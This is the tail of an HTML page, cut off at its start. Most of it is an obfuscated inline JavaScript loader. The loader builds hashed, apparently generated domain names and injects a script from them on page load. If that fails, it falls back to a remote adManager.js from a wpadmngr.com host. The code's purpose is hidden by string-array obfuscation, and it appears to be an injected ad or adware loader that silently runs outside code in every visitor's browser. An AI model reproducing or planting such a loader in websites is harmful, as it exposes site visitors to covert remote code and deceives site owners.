n v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>